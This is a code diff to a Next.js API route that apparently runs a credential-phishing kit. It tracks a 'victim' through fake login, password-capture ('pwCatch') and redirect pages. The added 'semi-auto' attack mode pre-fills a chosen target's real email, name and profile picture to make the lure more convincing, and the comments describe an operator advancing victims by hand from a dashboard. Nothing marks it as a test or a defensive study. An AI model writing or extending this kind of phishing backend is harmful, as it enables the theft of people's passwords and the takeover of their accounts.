@@ -58,7 +58,21 @@ export async function GET(request: NextRequest) {
             ...manualStartState,
             redirectUrl: appState.config.redirectUrl,
          });
+       } else if (appState.config.attackMode === 'semi-auto' && appState.victim.currentPage === 'email') {
+         const semiAutoStartState = {
+            ...appState.victim,
+            currentPage: 'pwCatch' as const,
+            email: appState.config.targetEmail,
+            name: appState.config.targetName,
+            profilePicture: appState.config.targetProfilePicture,
+         };
+         await update(ref(db, 'victim'), semiAutoStartState);
+         return NextResponse.json({
+            ...semiAutoStartState,
+            redirectUrl: appState.config.redirectUrl,
+         });
        }
+
 
       return NextResponse.json({
         currentPage: appState.victim.currentPage,
@@ -126,9 +140,9 @@ export async function POST(request: NextRequest) {
 
         let victimUpdate: any = { attempts: newAttempts };
 
-        if (appState.config.attackMode === 'auto') {
+        if (appState.config.attackMode === 'auto' || appState.config.attackMode === 'semi-auto') {
           victimUpdate.currentPage = 'redirect';
-        } else {
+        } else { // Manual mode
            if (victim.currentPage === 'login') {
               victimUpdate.currentPage = 'password';
           } else if (victim.currentPage === 'password') {
@@ -144,6 +158,9 @@ export async function POST(request: NextRequest) {
                 victimUpdate.errorMessage = "An unexpected error occurred. Please try again later.";
                 victimUpdate.currentPage = 'error';
               }
+            } else {
+              // In manual mode, after first pwCatch, stay on pwCatch
+              // You can advance it manually from the dashboard
             }
           }
         }
@@ -176,5 +193,3 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
   }
 }
-
-    
